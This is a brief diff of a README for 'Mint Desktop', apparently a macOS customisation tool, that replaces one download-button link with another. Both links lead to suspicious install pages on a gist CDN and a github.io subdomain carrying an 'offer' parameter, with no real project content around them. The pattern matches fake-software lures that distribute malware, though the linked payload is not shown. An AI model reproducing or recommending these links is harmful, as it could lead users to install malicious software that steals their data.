@@ -1,7 +1,7 @@
 # Mint Desktop — macOS UI Customization Tool
 Easily enhance and personalize the macOS interface with Mint’s themed desktop features.
 
-<a href="https://gistcdn.githack.com/manggianna84akiko/7140661179d94fc68de300068748192b/raw/77d4ac2731aa1d51a500ef7d89670f1fbe4563ad/install.html?offer=Mint" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Mint" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Mint%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
